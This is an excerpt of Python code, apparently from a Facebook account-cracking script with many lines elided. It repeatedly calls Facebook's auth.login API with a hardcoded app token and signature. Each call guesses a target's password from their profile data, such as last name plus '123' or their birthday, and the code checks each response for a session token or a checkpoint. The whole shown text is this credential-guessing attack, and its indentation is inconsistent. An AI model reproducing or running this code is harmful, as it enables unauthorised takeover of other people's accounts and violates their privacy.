...
def mini():
    ...
    try:
        ...
        try:
            ...
            encodedUrl = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
	        encodedUrl = urllib.quote(encodedUrl.encode('utf8'), ':/')
            data = urllib.urlopen(encodedUrl)
            y = json.load(data)
            if 'access_token' in y:
                ...
                if 'www.facebook.com' in y['error_msg']:
                    ...
                    encodedUrl = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
			        encodedUrl = urllib.quote(encodedUrl.encode('utf8'), ':/')
			        data = urllib.urlopen(encodedUrl)
                    y = json.load(data)
                    if 'access_token' in y:
                        ...
                        if 'www.facebook.com' in y['error_msg']:
                            ...
                            pz3 = a['last_name'] + '123'
                            encodedUrl = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
			                encodedUrl = urllib.quote(encodedUrl.encode('utf8'), ':/')
	                        data = urllib.urlopen(encodedUrl)
                            y = json.load(data)
                            if 'access_token' in y:
...
def pilih_super():
    ...
    def main(arg):
        ...
        try:
            ...
            encodedUrl = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
	        encodedUrl = urllib.quote(encodedUrl.encode('utf8'), ':/')
            data = urllib.urlopen(encodedUrl)
            q = json.load(data)
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    encodedUrl = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
			        encodedUrl = urllib.quote(encodedUrl.encode('utf8'), ':/')
			        data = urllib.urlopen(encodedUrl)
                    q = json.load(data)
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            encodedUrl ='https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
				            encodedUrl = urllib.quote(encodedUrl.encode('utf8'), ':/')
				            data = urllib.urlopen(encodedUrl)
                            q = json.load(data)
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    encodedUrl = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
				                    encodedUrl = urllib.quote(encodedUrl.encode('utf8'), ':/')
				                    data = urllib.urlopen(encodedUrl)
                                    q = json.load(data)
                                    if 'access_token' in q:
